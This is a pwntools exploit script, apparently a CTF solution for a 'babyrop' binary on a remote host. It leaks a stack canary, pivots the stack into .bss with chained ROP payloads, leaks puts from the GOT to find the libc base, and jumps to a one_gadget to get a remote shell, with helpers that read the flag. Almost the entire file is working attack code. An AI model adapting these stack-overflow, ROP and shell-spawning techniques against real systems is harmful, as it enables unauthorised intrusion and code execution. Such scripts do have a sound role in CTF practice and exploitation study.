# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './babyrop'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '123.57.131.167'
    port = '20986'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
uu64= lambda a          : u64(p.recv(a).ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def boom( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

# one_gad = one_gadget(libc.path)

def attack():
    
    pop_2_ret = 0x400910
    pop_rdi_ret = 0x400913
    vuln_addr = 0x400717
    text_addr = 0x40072E
    text_addr2 = 0x4007C3
    text_puts_addr = 0x4007B5
    leave_ret = 0x4008A2

    puts_got = elf.got['puts']
    puts_plt = elf.plt['puts']

    bss_addr = elf.bss(0x100)

    # bss_addr = 0x3fe3b8 - 0x20
    sla('name?','a'*0x19)
    
    ru('a'*0x19)
    canary = u64(p.recv(7).rjust(8,'\x00'))
    lg('canary',canary)
    sla('challenge!',0x4009AE)

    payload = 'a'*0x18 + flat(canary ,  bss_addr + 0x20 , text_addr2)

    # dbg('*0x400744\nb *0x40075B')
    sa('message',payload)

    payload = flat( pop_rdi_ret , puts_got ,pop_2_ret ) + '\n'
    se( payload )
    sla('challenge!',0x4009AE)

    payload = 'a'*0x18 + flat(canary ,  bss_addr + 0x20 + 0x28 , text_addr2)
    sa('message',payload)

    payload = flat( puts_plt,vuln_addr ) + '\n'
    # dbg()
    se( payload )
    sla('challenge!',0x4009AE)
    # dbg('*0x400744\nb *0x40075B')
    payload = 'a'*0x18 + flat(canary ,  bss_addr - 0x8 , leave_ret)
    sa('message',payload)
    # dbg('*0x400744\nb *0x40075B')

    puts_addr = l64()
    libc.address = puts_addr - libc.sym['puts']
    ogg = libc.address + 0x4f3d5

    payload = 'a'*0x18 + flat(canary ,  0 , ogg)
    se(payload)


    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   babyrop.py
@Time    :   2021/12/11 12:53:48
@Author  :   Niyah 
'''